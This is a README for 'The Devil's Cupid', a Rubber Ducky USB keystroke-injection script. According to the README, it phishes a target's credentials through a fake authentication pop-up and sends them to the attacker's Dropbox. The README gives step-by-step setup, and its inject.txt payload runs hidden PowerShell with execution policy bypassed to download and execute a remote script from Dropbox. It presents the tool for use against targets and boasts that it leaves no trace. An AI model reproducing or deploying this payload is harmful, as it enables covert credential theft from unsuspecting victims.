
![Logo](https://static.vecteezy.com/system/resources/previews/005/308/344/original/devil-cupid-illustration-vector.jpg)
# The Devil's Cupid
Version 1.0  
Last updated 24/02/2023

The Devil's Cupid is a Rubber Ducky script that tricks your target into sharing their credentials through a fake authentication pop up message.  
It is highly adaptable and leaves no trace. (Thank you Avunit ❤️)


## Setup

What you'll need:
- A [Rubber Ducky USB HID Device](https://shop.hak5.org/products/usb-rubber-ducky) (Also works on old gen!)
- A DropBox account.
- A [DropBox Access Token](https://help.displayr.com/hc/en-us/articles/360004116315-How-to-Create-an-Access-Token-for-Dropbox#:~:text=Go%20to%20the%20Dropbox%20App,section%20and%20click%20on%20Generate.)

### Step 1
Go to your [DropBox App Console](https://www.dropbox.com/developers/apps) and click **Create app**.  

![App creation](https://i.imgur.com/KsAChJF.png)  
Configure the app as shown above. You can change *Name you app* to whatever you want.  
After you've named your app, click **Create app**.

Once your app is created, navigate to the **Permissions** tab.  
You need to enable:
- **files.metadata.write**
- **files.content.write**
- **files.content.read**
- **file_requests.write**

After making those changes, click **Submit** at teh bottom of the page to apply them.

![Permissions](https://i.imgur.com/5fGB38H.png)

Navigate back to the **Settings** tab.

![Access Token](https://i.imgur.com/H79vVY5.png)

Under **Generate access token** click **Generate**.  
You will get a unique access token. Do not share it with anyone!  

**Copy the token.** You will need it in the next step.

### Step 2
Open **devilsCupid.ps1** and edit `$DropBoxAccessToken = "<YOUR DROPBOX ACCESS TOKEN HERE>"`.  
Replace `<YOUR DROPBOX ACCESS TOKEN HERE>` with your token.

For example, if your access token is `...gwireg3hiu6rg8asasfsads2ad...` it should look like this:  
`$DropBoxAccessToken = "...gwireg3hiu6rg8asasfsads2ad..."`.

**Save the file.**

### Step 2

Go to your DropBox and upload your modified **devilsCupid.ps1** to it.

![DropBox Screenshot](https://i.imgur.com/9GcOXVi.png)

Once it's done uploading, click **Copy link**.  
The link should look something like `https://www.dropbox.com/s/sk10x6okx49kcq9/devilsCupid.ps1?dl=0`.

### Step 3
Open **inject.txt**.  
It will look like this:

```bash
DELAY 1000
GUI r
DELAY 500
STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr LINK_TO_YOUR_DEVILSCUPID.PS1; invoke-expression $pl
ENTER
```

Replace **LINK_TO_YOUR_DEVILSCUPID.PS1** with the link you've copied in the previous step.

**VERY IMPORTANT:** Replace the end **dl=0** with **dl=1**.  
The modified link should look like `https://www.dropbox.com/s/sk10x6okx49kcq9/devilsCupid.ps1?dl=1`. 

The modified **inject.txt** should look something like this:
```bash
DELAY 1000
GUI r
DELAY 500
STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://www.dropbox.com/s/sk10x6okx49kcq9/devilsCupid.ps1?dl=1; invoke-expression $pl
ENTER
```
Save the changes.

### Step 4

Navigate to [Ducktoolkit.com](https://ducktoolkit.com/encode). Credits to [James Hall](https://twitter.com/411hall) & [Kevin Breen](https://techanarchy.net/) for this awesome tool ❤️

![Duck Toolkit](https://i.imgur.com/ymaeeN7.png)

Paste your modified **inject.txt** code in the Duck Code box.  
Select the keyboard layout under *Language* tab.  
Click **Encode Payload**. 

After encoding click **Download inject.bin**.

Put the **inject.bin** file on your Rubber Ducky.  
You're done!
